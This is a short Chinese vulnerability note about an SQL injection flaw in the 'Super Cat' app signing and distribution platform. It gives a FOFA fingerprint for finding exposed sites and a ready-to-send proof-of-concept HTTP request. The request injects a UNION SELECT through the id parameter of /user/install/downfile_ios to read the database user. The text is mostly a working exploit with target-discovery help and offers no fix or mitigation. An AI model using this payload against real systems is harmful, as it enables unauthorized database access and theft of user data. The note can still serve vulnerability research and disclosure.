# 超级猫签名APP分发平台前台存在SQL注入漏洞

超级猫超级签名分发平台是一个安卓苹果APP分发平台，能够对所有安卓苹果的APP进行签名分发，使所有自行开发的APP能够签名使用，包括登录注册等功能，还提供有SDK

## fofa

```java
"/themes/97013266/public/static/css/pc.css"
```

## poc

```yaml
GET /user/install/downfile_ios?id=') UNION ALL SELECT NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 127.0.0.1:81
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20240727115946636](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271159715.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/xTcnm_fFubFCYw4LhIXwkQ